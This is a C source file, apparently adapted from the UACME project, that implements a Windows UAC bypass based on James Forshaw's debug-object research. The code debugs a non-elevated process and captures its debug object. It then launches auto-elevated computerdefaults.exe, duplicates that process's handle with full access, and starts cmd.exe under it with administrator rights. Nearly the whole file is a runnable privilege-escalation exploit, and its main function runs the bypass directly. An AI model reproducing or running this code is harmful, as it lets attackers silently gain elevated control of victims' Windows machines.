/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2017 - 2020B
*
*  TITLE:       TYRANID.C
*
*  VERSION:     3.54
*
*  DATE:        24 Nov 2020
*
*  James Forshaw autoelevation method(s)
*  Fine Dinning Tool (c) CIA
*
*  For description please visit original URL
*  https://tyranidslair.blogspot.ru/2017/05/exploiting-environment-variables-in.html
*  https://tyranidslair.blogspot.ru/2017/05/reading-your-way-around-uac-part-1.html
*  https://tyranidslair.blogspot.ru/2017/05/reading-your-way-around-uac-part-2.html
*  https://tyranidslair.blogspot.ru/2017/05/reading-your-way-around-uac-part-3.html
*  https://tyranidslair.blogspot.com/2019/02/accessing-access-tokens-for-uiaccess.html
*  https://googleprojectzero.blogspot.com/2019/12/calling-local-windows-rpc-servers-from.html
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "ntlib/util.h"
#include <windows.h>
#include <taskschd.h>
#include <combaseapi.h>

//disable nonmeaningful warnings.
#pragma warning(disable: 4005) // macro redefinition
#pragma warning(disable: 4055) // %s : from data pointer %s to function pointer %s
#pragma warning(disable: 4152) // nonstandard extension, function/data pointer conversion in expression
#pragma warning(disable: 4201) // nonstandard extension used : nameless struct/union
#pragma warning(disable: 6102) // Using %s from failed function call at line %u
#pragma warning(disable: 6258) // Using TerminateThread does not allow proper thread clean up
#pragma warning(disable: 6320) // exception-filter expression is the constant EXCEPTION_EXECUTE_HANDLER
#pragma warning(disable: 6255 6263)  // alloca
#pragma warning(disable: 28159)

#include <Windows.h>
#include <ntstatus.h>
#include <CommCtrl.h>
#include <shlobj.h>
#include <AccCtrl.h>
#include <wintrust.h>
#include <taskschd.h>
#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "rpcrt4.lib")

#pragma warning(push)
#pragma warning(disable: 4115) //named type definition in parentheses

#include "aic.c"

wchar_t* _strcpy_w(wchar_t* dest, const wchar_t* src)
{
    wchar_t* p;

    if ((dest == 0) || (src == 0))
        return dest;

    if (dest == src)
        return dest;

    p = dest;
    while (*src != 0) {
        *p = *src;
        p++;
        src++;
    }

    *p = 0;
    return dest;
}

wchar_t* _strcat_w(wchar_t* dest, const wchar_t* src)
{
    if ((dest == 0) || (src == 0))
        return dest;

    while (*dest != 0)
        dest++;

    while (*src != 0) {
        *dest = *src;
        dest++;
        src++;
    }

    *dest = 0;
    return dest;
}



typedef struct _UACME_CONTEXT {
    BOOLEAN                 IsWow64;
    BOOLEAN                 UserRequestsAutoApprove;
    BOOL                    OutputToDebugger;
    ULONG                   Cookie;
    ULONG                   dwBuildNumber;
    ULONG                   AkagiFlag;
    ULONG                   IFileOperationFlags;

    // Count of characters
    ULONG                   OptionalParameterLength;

    PVOID    ucmHeap;
    PVOID    DecompressRoutine;
    PVOID    FusionContext;
    PVOID    SharedContext;

    // Windows directory with end slash
    WCHAR                   szSystemRoot[MAX_PATH + 1];

    // Windows\System32 directory with end slash
    WCHAR                   szSystemDirectory[MAX_PATH + 1];

    // Current user temp directory with end slash
    WCHAR                   szTempDirectory[MAX_PATH + 1];

    // Current program directory with end slash
    WCHAR                   szCurrentDirectory[MAX_PATH + 1];

    // Optional parameter, limited to MAX_PATH
    WCHAR                   szOptionalParameter[MAX_PATH + 1];

    // Default payload (system32\cmd.exe), limited to MAX_PATH
    WCHAR                   szDefaultPayload[MAX_PATH + 1];
} UACMECONTEXT, * PUACMECONTEXT;

PUACMECONTEXT g_ctx;
/*
* supHeapAlloc
*
* Purpose:
*
* Wrapper for RtlAllocateHeap with ucmHeap.
*
*/
PVOID FORCEINLINE supHeapAlloc(
    _In_ SIZE_T Size)
{
    return RtlAllocateHeap(g_ctx->ucmHeap, HEAP_ZERO_MEMORY, Size);
}
/*
* supHeapFree
*
* Purpose:
*
* Wrapper for RtlFreeHeap with ucmHeap.
*
*/
BOOL FORCEINLINE supHeapFree(
    _In_ PVOID Memory)
{
    return RtlFreeHeap(g_ctx->ucmHeap, 0, Memory);
}

/*
* supGetProcessDebugObject
*
* Purpose:
*
* Reference process debug object.
*
*/
NTSTATUS supGetProcessDebugObject(
    _In_ HANDLE ProcessHandle,
    _Out_ PHANDLE DebugObjectHandle)
{
    return NtQueryInformationProcess(
        ProcessHandle,
        ProcessDebugObjectHandle,
        DebugObjectHandle,
        sizeof(HANDLE),
        NULL);
}


/*
* ucmxCreateProcessFromParent
*
* Purpose:
*
* Create new process using parent process handle.
*
*/
NTSTATUS ucmxCreateProcessFromParent(
    _In_ HANDLE ParentProcess,
    _In_ LPWSTR Payload)
{
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    SIZE_T size = 0x30;

    STARTUPINFOEX si;
    PROCESS_INFORMATION pi;

    RtlSecureZeroMemory(&pi, sizeof(pi));
    RtlSecureZeroMemory(&si, sizeof(si));
    si.StartupInfo.cb = sizeof(STARTUPINFOEX);

    do {
        if (size > 1024)
            break;
        auto p = malloc(size);

        *(PVOID*)(&si.lpAttributeList) = p;
        if (si.lpAttributeList) {

            if (InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size)) {
                if (UpdateProcThreadAttribute(si.lpAttributeList, 0,
                    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &ParentProcess, sizeof(HANDLE), 0, 0)) //-V616
                {
                    si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
                    si.StartupInfo.wShowWindow = SW_SHOW;

                    if (CreateProcess(NULL,
                        Payload,
                        NULL,
                        NULL,
                        FALSE,
                        CREATE_UNICODE_ENVIRONMENT | EXTENDED_STARTUPINFO_PRESENT,
                        NULL,
                        g_ctx->szSystemRoot,
                        (LPSTARTUPINFO)&si,
                        &pi))
                    {
                        CloseHandle(pi.hThread);
                        CloseHandle(pi.hProcess);
                        status = STATUS_SUCCESS;
                    }
                }
            }

            if (si.lpAttributeList)
                DeleteProcThreadAttributeList(si.lpAttributeList); //dumb empty routine

            free(si.lpAttributeList);
        }
    } while (GetLastError() == ERROR_INSUFFICIENT_BUFFER);

    return status;
}
#define _strcpy _strcpy_w
#define _strcat _strcat_w

/*
* ucmDebugObjectMethod
*
* Purpose:
*
* Bypass UAC by direct RPC call to APPINFO and DebugObject use.
*
*/
NTSTATUS ucmDebugObjectMethod(
    _In_ LPWSTR lpszPayload
)
{
    //UINT retryCount = 0;

    NTSTATUS status = STATUS_ACCESS_DENIED;

    HANDLE dbgHandle = NULL, dbgProcessHandle, dupHandle;

    PROCESS_INFORMATION procInfo;

    DEBUG_EVENT dbgEvent;

    WCHAR szProcess[MAX_PATH * 2];


    do {

        //
        // Spawn initial non elevated victim process under debug.
        //


        //do { /* remove comment for attempt to spam debug object within thread pool */
        _strcpy(szProcess, L"C:\\Windows\\System32\\");
        _strcat(szProcess, WINVER_EXE);

        if (!AicLaunchAdminProcess(szProcess,
            szProcess,
            0,
            CREATE_UNICODE_ENVIRONMENT | DEBUG_PROCESS,
            g_ctx->szSystemRoot,
            (LPWSTR)(L"WinSta0\\Default"),
            NULL,
            INFINITE,
            SW_HIDE,
            &procInfo))
        {
            status = STATUS_UNSUCCESSFUL;
            break;
        }


        //
        // Capture debug object handle.
        //

        status = supGetProcessDebugObject(procInfo.hProcess,
            &dbgHandle);

        if (!NT_SUCCESS(status)) {
            TerminateProcess(procInfo.hProcess, 0);
            CloseHandle(procInfo.hThread);
            CloseHandle(procInfo.hProcess);
            break;
        }

        //
        // Detach debug and kill non elevated victim process.
        //
        ((void(NTAPI*)(HANDLE, HANDLE))GetProcAddress(LoadLibraryA("ntdll"), "NtRemoveProcessDebug"))(procInfo.hProcess, dbgHandle);
        TerminateProcess(procInfo.hProcess, 0);
        CloseHandle(procInfo.hThread);
        CloseHandle(procInfo.hProcess);

        //} while (++retryCount < 20);

        //
        // Spawn elevated victim under debug.
        //
        _strcpy(szProcess, L"C:\\Windows\\System32\\");
        _strcat(szProcess, COMPUTERDEFAULTS_EXE);
        RtlSecureZeroMemory(&procInfo, sizeof(procInfo));
        RtlSecureZeroMemory(&dbgEvent, sizeof(dbgEvent));

        if (!AicLaunchAdminProcess(szProcess,
            szProcess,
            1,
            CREATE_UNICODE_ENVIRONMENT | DEBUG_PROCESS,
            g_ctx->szSystemRoot,
            (LPWSTR)(L"WinSta0\\Default"),
            NULL,
            INFINITE,
            SW_HIDE,
            &procInfo))
        {
            status = STATUS_UNSUCCESSFUL;
            break;
        }

        //
        // Update thread TEB with debug object handle to receive debug events.
        //
        ((void(NTAPI*)(HANDLE))GetProcAddress(LoadLibraryA("ntdll"), "DbgUiSetThreadDebugObject"))(dbgHandle);
        dbgProcessHandle = NULL;

        //
        // Debugger wait cycle.
        //
        while (1) {

            if (!WaitForDebugEvent(&dbgEvent, INFINITE))
                break;

            switch (dbgEvent.dwDebugEventCode) {

                //
                // Capture initial debug event process handle.
                //
            case CREATE_PROCESS_DEBUG_EVENT:
                dbgProcessHandle = dbgEvent.u.CreateProcessInfo.hProcess;
                break;
            }

            if (dbgProcessHandle)
                break;

            ContinueDebugEvent(dbgEvent.dwProcessId, dbgEvent.dwThreadId, DBG_CONTINUE);

        }

        if (dbgProcessHandle == NULL)
            break;

        //
        // Create new handle from captured with PROCESS_ALL_ACCESS.
        //
        dupHandle = NULL;
        status = NtDuplicateObject(dbgProcessHandle,
            NtCurrentProcess(),
            NtCurrentProcess(),
            &dupHandle,
            PROCESS_ALL_ACCESS,
            0,
            0);

        if (NT_SUCCESS(status)) {
            //
            // Run new process with parent set to duplicated process handle.
            //
            ucmxCreateProcessFromParent(dupHandle, lpszPayload);
            NtClose(dupHandle);
        }

#pragma warning(push)
#pragma warning(disable: 6387)
        ((void(NTAPI*)(HANDLE))GetProcAddress(LoadLibraryA("ntdll"), "DbgUiSetThreadDebugObject"))(0);
#pragma warning(pop)

        NtClose(dbgHandle);
        dbgHandle = NULL;

        CloseHandle(dbgProcessHandle);

        //
        // Release victim process.
        //
        CloseHandle(procInfo.hThread);
        TerminateProcess(procInfo.hProcess, 0);
        CloseHandle(procInfo.hProcess);

    } while (FALSE);

    if (dbgHandle) NtClose(dbgHandle);

    return status;
}


int WinMain(HINSTANCE, HINSTANCE, char*, int)
{

#define DEFAULT_ALLOCATION_TYPE MEM_COMMIT | MEM_RESERVE
#define DEFAULT_PROTECT_TYPE PAGE_READWRITE

    if (FAILED(CoInitializeEx(NULL, COINIT_APARTMENTTHREADED))) return -1;

    SIZE_T Size = sizeof(UACMECONTEXT);
    *(PVOID*)&g_ctx = VirtualAlloc(0, Size, DEFAULT_ALLOCATION_TYPE, DEFAULT_PROTECT_TYPE);
    g_ctx->ucmHeap = RtlCreateHeap(0, NULL, 0, 0, NULL, NULL);


    _strcpy(g_ctx->szSystemRoot, L"C:\\Windows\\");
    _strcat(g_ctx->szSystemDirectory, L"C:\\Windows\\System32\\");


    wchar_t buff[] = L"cmd.exe";
    return ucmDebugObjectMethod(buff);
}
